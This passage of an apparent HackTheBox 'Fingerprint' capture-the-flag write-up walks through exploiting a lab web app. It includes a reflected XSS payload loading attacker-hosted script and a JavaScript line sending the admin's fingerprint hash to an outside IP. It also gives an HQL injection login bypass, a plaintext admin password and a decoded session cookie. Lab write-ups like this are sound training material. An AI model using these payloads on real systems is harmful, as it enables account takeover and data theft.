<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">def check(user, password):</span><br><span class="line"></span><br><span class="line">from .util import build_safe_sql_where</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;users.db&#x27;</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cond = build_safe_sql_where(&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: password&#125;)</span><br><span class="line"></span><br><span class="line">query = <span class="string">&quot;select * from users &quot;</span> + cond</span><br><span class="line"></span><br><span class="line">cursor.execute(query)</span><br><span class="line"></span><br><span class="line">rows = cursor.fetchall()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> rows:</span><br><span class="line"><span class="built_in">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> None</span><br></pre></td></tr></table></figure>

<p>We can check how SQL is made “safe” by grabbing it from the util file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def build_safe_sql_where(m):</span><br><span class="line">query = <span class="string">&quot; where 1=1&quot;</span></span><br><span class="line"><span class="keyword">for</span> (key, value) <span class="keyword">in</span> m.items():</span><br><span class="line"><span class="keyword">if</span> not value or <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> value or <span class="string">&quot;\&quot;&quot;</span> <span class="keyword">in</span> value or <span class="string">&quot; &quot;</span> <span class="keyword">in</span> value:</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot; where 1=0&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">query = query + <span class="string">&quot; and &quot;</span>+ key+<span class="string">&quot;=&#x27;&quot;</span>+ str(value)+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> query</span><br></pre></td></tr></table></figure>

<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>We can look back to the creds we found earlier from users.db and sign in as the admin. We have auth.log which is available to us and reflects sign in attempts on port 8080. We can easily get XSS using a simple payload and it gets reflected back to us via the log file:</p>
<p>The log file clears every minute or so. We can try PHP payloads instead however they don’t seem to be executed. (It’s a flask app so it won’t use PHP). We can go back to looking at app.py and see that any logs from localhost are filtered out so we may not be able to see execution regardless. Capturing it in burp also shows us something else interesting:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=admin&amp;auth_primary=u_will_never_guess_this_password&amp;auth_secondary=&lt;script+src=%3d<span class="string">&quot;http%3a//fingerprint.htb%3a8080//resources/js/login.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>After submitting this, we see there’s reference to a FingerprintID() function:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(<span class="string">&quot;auth_secondary&quot;</span>).value = getFingerPrintID()</span><br></pre></td></tr></table></figure>

<p>We can go to login.js and see the source code for this function:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getFingerPrintID</span></span>() &#123;</span><br><span class="line">    <span class="built_in">let</span> fingerprint = navigator.appCodeName + navigator.appVersion + (navigator.cookieEnabled ? <span class="string">&quot;yes&quot;</span> : <span class="string">&quot;no&quot;</span>) + navigator.language + navigator.platform + navigator.productSub + navigator.userAgent + navigator.vendor + screen.availWidth + <span class="string">&quot;&quot;</span> + screen.availHeight + <span class="string">&quot;&quot;</span> + screen.width + <span class="string">&quot;&quot;</span> + screen.height + <span class="string">&quot;&quot;</span> + screen.orientation.type + <span class="string">&quot;&quot;</span> + screen.pixelDepth + <span class="string">&quot;&quot;</span> + screen.colorDepth + Intl.DateTimeFormat().resolvedOptions().timeZone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (const plugin of navigator.plugins) &#123;</span><br><span class="line">        fingerprint += plugin.name + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (const mime of navigator.mimeTypes) &#123;</span><br><span class="line">        fingerprint += mime.type + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> MD5(fingerprint)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can see that fingerprint is made up of a huge amount of information from the person navigating to the page then MD5 hashed. The MD5 hasing function can be seen at the top of the page:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var MD5 = <span class="keyword">function</span> (d) &#123;</span><br><span class="line">    var r = M(V(Y(X(d), 8 * d.length)));</span><br><span class="line">    <span class="built_in">return</span> r.toLowerCase()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>It makes reference to a load of sub functions. We can copy this over to our local machine and reuse it to steal the admin’s fingerprint. We can create the following:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">var MD5 = <span class="keyword">function</span> (d) &#123;</span><br><span class="line">    var r = M(V(Y(X(d), 8 * d.length)));</span><br><span class="line">    <span class="built_in">return</span> r.toLowerCase()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> M(d) &#123;</span><br><span class="line">    <span class="keyword">for</span> (var _, m = <span class="string">&quot;0123456789ABCDEF&quot;</span>, f = <span class="string">&quot;&quot;</span>, r = 0; r &lt; d.length; r++) _ = d.charCodeAt(r), f += m.charAt(_ &gt;&gt;&gt; 4 &amp; 15) + m.charAt(15 &amp; _);</span><br><span class="line">    <span class="built_in">return</span> f</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> X(d) &#123;</span><br><span class="line">    <span class="keyword">for</span> (var _ = Array(d.length &gt;&gt; 2), m = 0; m &lt; _.length; m++) _[m] = 0;</span><br><span class="line">    <span class="keyword">for</span> (m = 0; m &lt; 8 * d.length; m += 8) _[m &gt;&gt; 5] |= (255 &amp; d.charCodeAt(m / 8)) &lt;&lt; <span class="string">m % 32;</span></span><br><span class="line"><span class="string">    return _</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function V(d) &#123;</span></span><br><span class="line"><span class="string">    for (var _ = &quot;&quot;, m</span> = 0; m &lt; 32 * d.length; m += 8) _ += String.fromCharCode(d[m &gt;&gt; 5] &gt;&gt;&gt; m % 32 &amp; 255);</span><br><span class="line">    <span class="built_in">return</span> _</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> Y(d, _) &#123;</span><br><span class="line">    d[_ &gt;&gt; 5] |= 128 &lt;&lt; <span class="string">_ % 32, d[14 + (_</span> + 64 &gt;&gt;&gt; 9 &lt;&lt; <span class="string">4)] = _;</span></span><br><span class="line"><span class="string">    for (var m = 1732584193, f = -271733879, r = -1732584194, i = 271733878, n = 0; n &lt; d.length; n += 16) &#123;</span></span><br><span class="line"><span class="string">        var h = m, t = f, g = r, e = i;</span></span><br><span class="line"><span class="string">        f = md5_ii(f = md5_ii(f = md5_ii(f = md5_ii(f = md5_hh(f = md5_hh(f = md5_hh(f = md5_hh(f = md5_gg(f = md5_gg(f = md5_gg(f = md5_gg(f = md5_ff(f = md5_ff(f = md5_ff(f = md5_ff(f, r = md5_ff(r, i = md5_ff(i, m = md5_ff(m, f, r, i, d[n + 0], 7, -680876936), f, r, d[n + 1], 12, -389564586), m, f, d[n + 2], 17, 606105819), i, m, d[n + 3], 22, -1044525330), r = md5_ff(r, i = md5_ff(i, m = md5_ff(m, f, r, i, d[n + 4</span>], 7, -176418897), f, r, d[n + 5], 12, 1200080426), m, f, d[n + 6], 17, -1473231341), i, m, d[n + 7], 22, -45705983), r = md5_ff(r, i = md5_ff(i, m = md5_ff(m, f, r, i, d[n + 8], 7, 1770035416), f, r, d[n + 9], 12, -1958414417), m, f, d[n + 10], 17, -42063), i, m, d[n + 11], 22, -1990404162), r = md5_ff(r, i = md5_ff(i, m = md5_ff(m, f, r, i, d[n + 12], 7, 1804603682), f, r, d[n + 13], 12, -40341101), m, f, d[n + 14], 17, -1502002290), i, m, d[n + 15], 22, 1236535329), r = md5_gg(r, i = md5_gg(i, m = md5_gg(m, f, r, i, d[n + 1], 5, -165796510), f, r, d[n + 6], 9, -1069501632), m, f, d[n + 11], 14, 643717713), i, m, d[n + 0], 20, -373897302), r = md5_gg(r, i = md5_gg(i, m = md5_gg(m, f, r, i, d[n + 5], 5, -701558691), f, r, d[n + 10], 9, 38016083), m, f, d[n + 15], 14, -660478335), i, m, d[n + 4], 20, -405537848), r = md5_gg(r, i = md5_gg(i, m = md5_gg(m, f, r, i, d[n + 9], 5, 568446438), f, r, d[n + 14], 9, -1019803690), m, f, d[n + 3], 14, -187363961), i, m, d[n + 8], 20, 1163531501), r = md5_gg(r, i = md5_gg(i, m = md5_gg(m, f, r, i, d[n + 13], 5, -1444681467), f, r, d[n + 2], 9, -51403784), m, f, d[n + 7], 14, 1735328473), i, m, d[n + 12], 20, -1926607734), r = md5_hh(r, i = md5_hh(i, m = md5_hh(m, f, r, i, d[n + 5], 4, -378558), f, r, d[n + 8], 11, -2022574463), m, f, d[n + 11], 16, 1839030562), i, m, d[n + 14], 23, -35309556), r = md5_hh(r, i = md5_hh(i, m = md5_hh(m, f, r, i, d[n + 1], 4, -1530992060), f, r, d[n + 4], 11, 1272893353), m, f, d[n + 7], 16, -155497632), i, m, d[n + 10], 23, -1094730640), r = md5_hh(r, i = md5_hh(i, m = md5_hh(m, f, r, i, d[n + 13], 4, 681279174), f, r, d[n + 0], 11, -358537222), m, f, d[n + 3], 16, -722521979), i, m, d[n + 6], 23, 76029189), r = md5_hh(r, i = md5_hh(i, m = md5_hh(m, f, r, i, d[n + 9], 4, -640364487), f, r, d[n + 12], 11, -421815835), m, f, d[n + 15], 16, 530742520), i, m, d[n + 2], 23, -995338651), r = md5_ii(r, i = md5_ii(i, m = md5_ii(m, f, r, i, d[n + 0], 6, -198630844), f, r, d[n + 7], 10, 1126891415), m, f, d[n + 14], 15, -1416354905), i, m, d[n + 5], 21, -57434055), r = md5_ii(r, i = md5_ii(i, m = md5_ii(m, f, r, i, d[n + 12], 6, 1700485571), f, r, d[n + 3], 10, -1894986606), m, f, d[n + 10], 15, -1051523), i, m, d[n + 1], 21, -2054922799), r = md5_ii(r, i = md5_ii(i, m = md5_ii(m, f, r, i, d[n + 8], 6, 1873313359), f, r, d[n + 15], 10, -30611744), m, f, d[n + 6], 15, -1560198380), i, m, d[n + 13], 21, 1309151649), r = md5_ii(r, i = md5_ii(i, m = md5_ii(m, f, r, i, d[n + 4], 6, -145523070), f, r, d[n + 11], 10, -1120210379), m, f, d[n + 2], 15, 718787259), i, m, d[n + 9], 21, -343485551), m = safe_add(m, h), f = safe_add(f, t), r = safe_add(r, g), i = safe_add(i, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> Array(m, f, r, i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> md5_cmn(d, _, m, f, r, i) &#123;</span><br><span class="line">    <span class="built_in">return</span> safe_add(bit_rol(safe_add(safe_add(_, d), safe_add(f, i)), r), m)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> md5_ff(d, _, m, f, r, i, n) &#123;</span><br><span class="line">    <span class="built_in">return</span> md5_cmn(_ &amp; m | ~_ &amp; f, d, _, r, i, n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> md5_gg(d, _, m, f, r, i, n) &#123;</span><br><span class="line">    <span class="built_in">return</span> md5_cmn(_ &amp; f | m &amp; ~f, d, _, r, i, n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> md5_hh(d, _, m, f, r, i, n) &#123;</span><br><span class="line">    <span class="built_in">return</span> md5_cmn(_ ^ m ^ f, d, _, r, i, n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> md5_ii(d, _, m, f, r, i, n) &#123;</span><br><span class="line">    <span class="built_in">return</span> md5_cmn(m ^ (_ | ~f), d, _, r, i, n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> safe_add(d, _) &#123;</span><br><span class="line">    var m = (65535 &amp; d) + (65535 &amp; _);</span><br><span class="line">    <span class="built_in">return</span> (d &gt;&gt; 16) + (_ &gt;&gt; 16) + (m &gt;&gt; 16) &lt;&lt; <span class="string">16 | 65535 &amp; m</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function bit_rol(d, _) &#123;</span></span><br><span class="line"><span class="string">    return d &lt;&lt; _ | d &gt;&gt;&gt; 32 - _</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function objToString(obj) &#123;</span></span><br><span class="line"><span class="string">    var str = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">    for (var p in obj) &#123;</span></span><br><span class="line"><span class="string">        str += p + &#x27;:&#x27; + obj[p] + &#x27;,&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return str;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function getFingerPrintID() &#123;</span></span><br><span class="line"><span class="string">    let fingerprint = navigator.appCodeName + navigator.appVersion + (navigator.cookieEnabled ? &quot;yes&quot; : &quot;no&quot;) + navigator.language + navigator.platform + navigator.productSub + navigator.userAgent + navigator.vendor + screen.availWidth + &quot;&quot; + screen.availHeight + &quot;&quot; + screen.width + &quot;&quot; + screen.height + &quot;&quot; + screen.orientation.type + &quot;&quot; + screen.pixelDepth + &quot;&quot; + screen.colorDepth + Intl.DateTimeFormat().resolvedOptions().timeZone;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    for (const plugin of navigator.plugins) &#123;</span></span><br><span class="line"><span class="string">        fingerprint += plugin.name + &quot;,&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    for (const mime of navigator.mimeTypes) &#123;</span></span><br><span class="line"><span class="string">        fingerprint += mime.type + &quot;,&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return MD5(fingerprint)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">location.href=&quot;http://10.10.14.25:8000/&quot;+getFingerPrintID();</span></span><br></pre></td></tr></table></figure>

<p>We can put this into a login.js file of our own and include it onto the page using:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://10.10.14.25:8000/login.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>Our final request is:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=admin&amp;auth_primary=u_will_never_guess_this_password&amp;auth_secondary=&lt;script+src%3d<span class="string">&quot;http%3a//10.10.14.25%3a8000/login.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>We can get the fingerprint of the admin:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Fingerprint]</span><br><span class="line">└─<span class="comment"># python2 -m SimpleHTTPServer                                                                                                 1 ⨯</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">10.10.11.127 - - [03/Feb/2022 08:37:03] <span class="string">&quot;GET /login.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.11.127 - - [03/Feb/2022 08:37:03] code 404, message File not found</span><br><span class="line">10.10.11.127 - - [03/Feb/2022 08:37:03] <span class="string">&quot;GET /962f4a03aa7ebc0515734cf398b0ccd6 HTTP/1.1&quot;</span> 404 -</span><br><span class="line">10.10.11.127 - - [03/Feb/2022 08:38:03] <span class="string">&quot;GET /login.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.11.127 - - [03/Feb/2022 08:38:03] code 404, message File not found</span><br><span class="line">10.10.11.127 - - [03/Feb/2022 08:38:03] <span class="string">&quot;GET /962f4a03aa7ebc0515734cf398b0ccd6 HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>Next is to actually get logged in, we don’t have a username or password however can look into the docs of glassfish and see that it uses HQL (Not SQL) and try HQLi:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;962f4a03aa7ebc0515734cf398b0ccd6&#x27;</span></span><br></pre></td></tr></table></figure>

<p>After my query, I get the following error:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.hibernate.exception.JDBCConnectionException: Unable to acquire JDBC Connection</span><br><span class="line">java.lang.IllegalArgumentException: org.hibernate.hql.internal.ast.QuerySyntaxException</span><br></pre></td></tr></table></figure>

<p>We can look through some resources online and find a general payload syntax:</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL2Jsb2IvbWFzdGVyL1NRTCUyMEluamVjdGlvbi9IUUwlMjBJbmplY3Rpb24ubWQ=">Hibernate Query Language Injection<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>We can try using a logical query and bypass the parts of the query that we don’t know:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=x<span class="string">&#x27; OR SUBSTRING(username,1,1)=&#x27;</span>m<span class="string">&#x27; and &#x27;</span><span class="string">&#x27;=&#x27;</span>&amp;auth_primary=x&amp;auth_secondary=962f4a03aa7ebc0515734cf398b0ccd6</span><br></pre></td></tr></table></figure>

<p>We’re finally in however still no shell, we probably need another exploit. We can see there’s a file upload function on the main page, all files that are uploaded get placed in &#x2F;images</p>
<p>This doesn’t get us particularly far. What’s more interesting is our cookie:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: JSESSIONID=fb8c54276d03b86ceee7d0244dcb; user=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFDMjFwWTJobFlXd3hNak0xIn0.6dfequ2JzMYm2A6wgo6SU_pJWzWgqmGaChbRiXiEgTw</span><br></pre></td></tr></table></figure>

<p>We can decode this and see there’s a serialized object:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sr!com.admin.security.src.model.User s_k I idL fingerprintt Ljava/lang/String;L passwordq~ L usernameq~ xp t@7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6t LWg7gUR1EmX7UNxsJxqZt micheal1235</span><br></pre></td></tr></table></figure>

<p>I didn’t have much luck with serialization. Instead we think back to &#x2F;backups and see if there’s any useful java files. We can bruteforce them and find Profile.java and User.java:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// http://fingerprint.htb:8080/backups/Profile.java</span><br><span class="line">package com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line">import com.admin.security.src.profile.UserProfileStorage;</span><br><span class="line">import lombok.Data;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">public class Profile implements Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 3995854114743474071L;</span><br><span class="line"></span><br><span class="line">    private final List&lt;String&gt; logs;</span><br><span class="line">    private final boolean adminProfile;</span><br><span class="line"></span><br><span class="line">    private File avatar;</span><br><span class="line"></span><br><span class="line">    public static Profile getForUser(final User user) &#123;</span><br><span class="line">        // fetch locally saved profile</span><br><span class="line">        final File file = user.getProfileLocation();</span><br><span class="line"></span><br><span class="line">        Profile profile;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!file.isFile()) &#123;</span><br><span class="line">            // no file -&gt; create empty profile</span><br><span class="line">            profile = new Profile(new ArrayList&lt;&gt;(), user.isAdmin());</span><br><span class="line">            try &#123;</span><br><span class="line">                user.updateProfile(profile);</span><br><span class="line">            &#125; catch (final IOException ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // init logs etc.</span><br><span class="line">        profile = new UserProfileStorage(user).readProfile();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> profile;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// http://fingerprint.htb:8080/backups/User.java</span><br><span class="line">package com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line">import com.admin.security.src.utils.FileUtil;</span><br><span class="line">import com.admin.security.src.utils.SerUtils;</span><br><span class="line">import lombok.AllArgsConstructor;</span><br><span class="line">import lombok.Data;</span><br><span class="line">import lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line">import javax.persistence.*;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">// import com.admin.security.src.model.UserProfileStorage;</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">@NoArgsConstructor</span><br><span class="line">@Entity</span><br><span class="line">@Data</span><br><span class="line">@Table(name = <span class="string">&quot;users&quot;</span>)</span><br><span class="line">public class User implements Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = -7780857363453462165L;</span><br><span class="line"></span><br><span class="line">    @Id</span><br><span class="line">    @GeneratedValue(strategy = GenerationType.IDENTITY)</span><br><span class="line">    @Column(name = <span class="string">&quot;id&quot;</span>)</span><br><span class="line">    protected int <span class="built_in">id</span>;</span><br><span class="line"></span><br><span class="line">    @Column(name = <span class="string">&quot;username&quot;</span>)</span><br><span class="line">    protected String username;</span><br><span class="line"></span><br><span class="line">    @Column(name = <span class="string">&quot;password&quot;</span>)</span><br><span class="line">    protected String password;</span><br><span class="line"></span><br><span class="line">    @Column(name = <span class="string">&quot;fingerprint&quot;</span>)</span><br><span class="line">    protected String fingerprint;</span><br><span class="line"></span><br><span class="line">    public File <span class="function"><span class="title">getProfileLocation</span></span>() &#123;</span><br><span class="line">        final File <span class="built_in">dir</span> = new File(<span class="string">&quot;/data/sessions/&quot;</span>);</span><br><span class="line">        dir.mkdirs();</span><br><span class="line"></span><br><span class="line">        final String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + username + <span class="string">&quot;.ser&quot;</span>;</span><br><span class="line">        <span class="built_in">return</span> Paths.get(pathname).normalize().toFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public boolean <span class="function"><span class="title">isAdmin</span></span>() &#123;</span><br><span class="line">   